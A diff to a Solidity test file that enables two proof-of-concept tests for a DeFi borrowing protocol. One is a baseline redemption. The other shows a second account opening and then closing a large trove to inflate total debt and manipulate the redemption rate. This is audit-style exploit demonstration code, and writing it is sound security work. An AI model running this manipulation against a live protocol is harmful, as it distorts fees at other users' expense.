@@ -213,51 +213,51 @@ contract PoCTest is TestSetup {
     _printTCR();
   }
 
-  //   /**
-  //    * @dev Test case: Normal redemption process
-  //    */
-  //   function test_poc_normalRedemption() public {
-  //     vm.startPrank(attacker);
+  /**
+   * @dev Test case: Normal redemption process
+   */
+  function test_poc_normalRedemption() public {
+    vm.startPrank(attacker);
 
-  //     // Step 1: Open a trove
-  //     uint256 debtAmount = 100000e18;
-  //     _openTrove(sbtcTroveManager, debtAmount, 2e18);
+    // Step 1: Open a trove
+    uint256 debtAmount = 100000e18;
+    _openTrove(sbtcTroveManager, debtAmount, 2e18);
 
-  //     // Step 2: Perform redemption
-  //     uint256 redemptionAmount = debtAmount - INIT_GAS_COMPENSATION; // Subtracting gas compensation
-  //     _redeemCollateral(sbtcTroveManager, redemptionAmount);
+    // Step 2: Perform redemption
+    uint256 redemptionAmount = debtAmount - INIT_GAS_COMPENSATION; // Subtracting gas compensation
+    _redeemCollateral(sbtcTroveManager, redemptionAmount);
 
-  //     uint256 redemptionRate = sbtcTroveManager.getRedemptionRateWithDecay();
-  //     console.log("Redemption Rate: %18e%", redemptionRate);
-  //   }
+    uint256 redemptionRate = sbtcTroveManager.getRedemptionRateWithDecay();
+    console.log("Redemption Rate: %18e%", redemptionRate);
+  }
 
-  //   /**
-  //    * @dev Test case: Redemption with debt inflation
-  //    */
-  //   function test_poc_redemptionWithDebtInflation() public {
-  //     vm.startPrank(attacker);
+  /**
+   * @dev Test case: Redemption with debt inflation
+   */
+  function test_poc_redemptionWithDebtInflation() public {
+    vm.startPrank(attacker);
 
-  //     // Step 1: Open a trove
-  //     uint256 debtAmount = 100_000e18;
-  //     _openTrove(sbtcTroveManager, debtAmount, 2e18);
+    // Step 1: Open a trove
+    uint256 debtAmount = 100_000e18;
+    _openTrove(sbtcTroveManager, debtAmount, 2e18);
 
-  //     // Step 2: Attacker2 opens a large trove to inflate total debt
-  //     vm.startPrank(attacker2);
-  //     uint256 largeDebtAmount = 500_000e18; // 0.5M DEBT
-  //     _openTrove(sbtcTroveManager, largeDebtAmount, 3e18);
+    // Step 2: Attacker2 opens a large trove to inflate total debt
+    vm.startPrank(attacker2);
+    uint256 largeDebtAmount = 500_000e18; // 0.5M DEBT
+    _openTrove(sbtcTroveManager, largeDebtAmount, 3e18);
 
-  //     // Step 3: Perform redemption
-  //     vm.startPrank(attacker);
-  //     uint256 redemptionAmount = debtAmount - INIT_GAS_COMPENSATION; // Subtracting gas compensation
-  //     _redeemCollateral(sbtcTroveManager, redemptionAmount);
+    // Step 3: Perform redemption
+    vm.startPrank(attacker);
+    uint256 redemptionAmount = debtAmount - INIT_GAS_COMPENSATION; // Subtracting gas compensation
+    _redeemCollateral(sbtcTroveManager, redemptionAmount);
 
-  //     // Step 4: Attacker2 closes their large trove
-  //     vm.startPrank(attacker2);
-  //     borrowerOps.closeTrove(sbtcTroveManager, attacker2);
+    // Step 4: Attacker2 closes their large trove
+    vm.startPrank(attacker2);
+    borrowerOps.closeTrove(sbtcTroveManager, attacker2);
 
-  //     uint256 redemptionRate = sbtcTroveManager.getRedemptionRateWithDecay();
-  //     console.log("Manipulated Redemption Rate: %18e%", redemptionRate);
-  //   }
+    uint256 redemptionRate = sbtcTroveManager.getRedemptionRateWithDecay();
+    console.log("Manipulated Redemption Rate: %18e%", redemptionRate);
+  }
 
   /**
    * @dev Test case: Stork Oracle stale price
